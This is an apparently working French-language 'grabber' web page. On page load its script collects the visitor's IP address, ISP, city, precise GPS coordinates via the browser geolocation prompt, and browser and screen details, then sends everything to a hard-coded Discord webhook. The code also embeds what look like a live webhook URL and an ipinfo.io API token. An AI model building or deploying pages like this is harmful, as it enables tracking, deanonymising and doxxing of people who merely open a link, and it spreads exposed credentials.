<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Informations Utilisateur</title>
</head>
<body>
    <h1>Récupération des informations utilisateur</h1>
    <p>Vos informations sont en cours d'envoi à Discord...</p>

    <script>
        // Fonction pour récupérer l'adresse IP et d'autres informations via l'API ipinfo.io
        async function getIPInfoFromIpInfo() {
            const token = 'f4deffc3cad09c';  // Ton token pour ipinfo
            const response = await fetch(`https://ipinfo.io/json?token=${token}`);
            const data = await response.json();
            return data;  // Renvoie toutes les informations d'IPinfo (IP, ville, région, pays, etc.)
        }

        // Fonction pour récupérer la localisation précise avec l'API Geolocation (Google popup)
        function getExactLocation() {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            const { latitude, longitude } = position.coords;
                            resolve({ latitude, longitude });
                        },
                        (error) => {
                            reject('Localisation refusée ou non disponible');
                        },
                        {
                            enableHighAccuracy: true,  // Demande la localisation précise
                            timeout: 10000,  // Temps d'attente maximum
                            maximumAge: 0    // Désactive la mise en cache
                        }
                    );
                } else {
                    reject('Geolocation non supportée par le navigateur');
                }
            });
        }

        // Récupérer les informations du navigateur (User-Agent, langue, mode clair/sombre, etc.)
        function getBrowserInfo() {
            const prefersDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
            const theme = prefersDarkMode ? 'Dark Mode' : 'Light Mode';
            return {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                theme: theme
            };
        }

        // Envoyer les informations au webhook Discord
        async function sendToDiscord(info) {
            const webhookURL = 'https://discord.com/api/webhooks/1293996885325119518/IEfRSxBo76Bmep2JlPNqE2E4Fh80hVwOKPirTpy55uwCxlcxzjrd3Yc-D16h6pQ1N-5f';  // Webhook Discord

            // Préparer les champs du payload
            const fields = [
                { name: "IP", value: info.ip || "Non disponible" },
                { name: "Ville", value: info.city || "Non disponible" },
                { name: "Région", value: info.region || "Non disponible" },
                { name: "Pays", value: info.country || "Non disponible" },
                { name: "Latitude", value: info.latitude || "Non disponible" },
                { name: "Longitude", value: info.longitude || "Non disponible" },
                { name: "Fournisseur Internet", value: info.org || "Non disponible" },
                { name: "User-Agent", value: info.userAgent || "Non disponible" },
                { name: "Langue", value: info.language || "Non disponible" },
                { name: "Système d'exploitation", value: info.platform || "Non disponible" },
                { name: "Résolution d'écran", value: info.screenResolution || "Non disponible" },
                { name: "Mode", value: info.theme || "Non disponible" }
            ];

            // Filtrer les champs pour éviter d'envoyer des champs vides ou null
            const validFields = fields.filter(field => field.value !== null && field.value !== "");

            const payload = {
                content: "Nouvelles informations utilisateur :",
                embeds: [{
                    title: "Informations de l'utilisateur",
                    fields: validFields
                }]
            };

            // Envoyer la requête POST
            const response = await fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            });

            if (!response.ok) {
                throw new Error(`Erreur lors de l'envoi : ${response.statusText}`);
            }
        }

        // Fonction principale
        async function main() {
            try {
                // Récupérer les informations via l'API IPinfo
                const ipInfo = await getIPInfoFromIpInfo();

                // Récupérer les informations du navigateur
                const browserInfo = getBrowserInfo();

                // Initialisation de la localisation exacte avec valeurs par défaut
                let locationInfo = { latitude: "Non disponible", longitude: "Non disponible" };

                // Récupérer la localisation exacte si l'utilisateur accepte via Geolocation API
                try {
                    locationInfo = await getExactLocation(); // Prend la localisation exacte si disponible
                } catch (error) {
                    console.warn(error);
                }

                // Combiner toutes les données
                const userInfo = {
                    ...ipInfo,         // Inclut les infos IP (ville, région, pays, etc.)
                    ...browserInfo,    // Inclut les infos du navigateur
                    ...locationInfo    // Inclut la latitude/longitude exacte
                };

                // Envoyer les informations au webhook Discord
                await sendToDiscord(userInfo);
                console.log('Les informations utilisateur ont été envoyées avec succès à Discord.');
            } catch (error) {
                console.error('Erreur lors de l\'envoi des informations à Discord:', error);
            }
        }

        // Exécuter la fonction principale
        main();
    </script>
</body>
</html>
